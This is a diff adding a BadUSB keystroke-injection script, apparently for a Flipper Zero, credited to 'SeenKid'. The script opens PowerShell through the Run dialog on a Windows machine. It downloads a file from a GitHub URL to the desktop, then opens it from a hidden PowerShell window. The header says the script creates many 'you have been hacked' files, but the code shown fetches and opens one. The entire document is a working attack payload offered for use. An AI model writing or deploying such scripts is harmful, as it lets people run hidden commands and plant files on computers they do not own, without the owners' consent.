@@ -1,0 +1,19 @@
+REM Author: SeenKid (seenkid on Discord)
+REM Description: Creates a lot of files with the text you have been hacked on desktop.
+REM Version:	1.0
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING $DesktopPath = [Environment]::GetFolderPath("Desktop"); Invoke-WebRequest -Uri https://raw.githubusercontent.com/SeenKid/flipper-zero-bad-usb/main/utils/files/verrouillage.txt -OutFile $DesktopPath/verrouillage.txt 
+DELAY 1200
+ENTER
+DELAY 400
+ALT F4
+DELAY 400
+GUI r
+DELAY 1200
+STRING powershell -WindowStyle Hidden -Command "$DesktopPath = [Environment]::GetFolderPath('Desktop'); Start-Process -FilePath \"$DesktopPath\verrouillage.txt\"
+ENTER
